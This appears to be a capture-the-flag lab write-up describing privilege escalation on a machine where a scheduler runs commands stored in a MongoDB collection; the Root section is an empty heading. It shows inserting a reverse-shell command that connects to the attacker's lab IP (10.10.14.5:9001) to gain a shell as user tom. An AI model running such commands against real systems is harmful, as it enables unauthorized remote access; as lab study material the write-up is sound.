
# Privilege Escalation

## Tom
- The user.txt is present in tom's home directory, and we cannot cat it out.
- In /var/scheduler we see app.js, which is different from the previous one. When we cat it out, we can see it is querying the database scheduler and collections tasks for "cmd" and executing it.
- We have our mongo creds, so we can login using `mongo -p -u mark scheduler` and provide the password when prompted.
- we can write into the tasks collections using 
```mongo
db.tasks.insertOne({ "cmd" : "touch /tmp/new"})
```
- We can check if the query has been executed using `db.tasks.find()`, as soon as it executes, it will be deleted.
- We can check in /tmp a new file has been created. The owner is tom.
```bash
mark@node:/tmp$ ls
... [snip] ...

-rw-r--r--  1 tom     tom        0 Apr  1 00:58 new.txt

... [snip] ...
```
- Thus we can get command execurtion. We can start a listener on our local machine and input the following in the mongo shell.

```
db.tasks.insertOne({ "cmd" : "bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'" })
```
- We will get a shell in one minute mark, we can set ssh for login next time.

## Root

